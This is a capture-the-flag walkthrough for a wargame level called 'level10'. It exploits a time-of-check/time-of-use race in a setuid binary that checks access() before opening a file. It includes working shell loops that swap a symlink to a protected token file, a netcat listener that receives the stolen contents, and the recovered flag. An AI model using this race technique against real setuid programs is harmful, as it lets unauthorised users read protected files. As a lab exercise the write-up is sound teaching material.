<h2>Exploit used: Time-Of-Check Time-Of-Use (TOCTOU)</h2>

1. Executable 'level10' takes a file (argv1) and sends them to a host (argv2) on port 6969, printing the contents of the file to the host's terminal

2. We need to setup a host/receiver, open a new terminal, SSH connect to the VM and `nc -lvk 6969'`

3. If we try to send the provided 'token' file to our receiver: `./level10 token 0.0.0.0` it does not work.<br>
The executable uses `access()` to verify if we have the permissions to open the given file ('token'), we obviously do not.

4. Luckily `access()` has a major exploitable flaw, as stated in the manual:<br>
*"Warning: Using these calls to check if a user is authorized to,
       for example, open a file before actually doing so using open(2)
       creates a **security hole**, because the user might **exploit the short
       time interval** between checking and opening the file to manipulate
       it.  For this reason, the use of this system call should be
       avoided."*

5.  To exploit the short time interval we have to resort to **BRUTEFORCE**:<br>
- Write a script that creates/deletes a file and creates/deletes a symbolic link (linked to token) infinitely:
```
#!/bin/sh

while true;
do

touch /tmp/link    #need to alternate with a regular file to TRICK the permission check,
rm /tmp/link
ln -s ~/token /tmp/link
rm /tmp/link

done
```
- Write another script that executes 'level10' with the symbolic link to our receiver:
```
#!/bin/sh

while true;
do

~/level10 /tmp/link 0.0.0.0

done

```

6. Run both scripts (you should have 3 VM terminals: script looping, script looping, netcat listening).<br>
On the host/receiver terminal, you will have plenty of messages displaying continuously and occasionally the flag will appear: woupa2yuojeeaaed06riuj63c

7. `su level10` + `getflag`
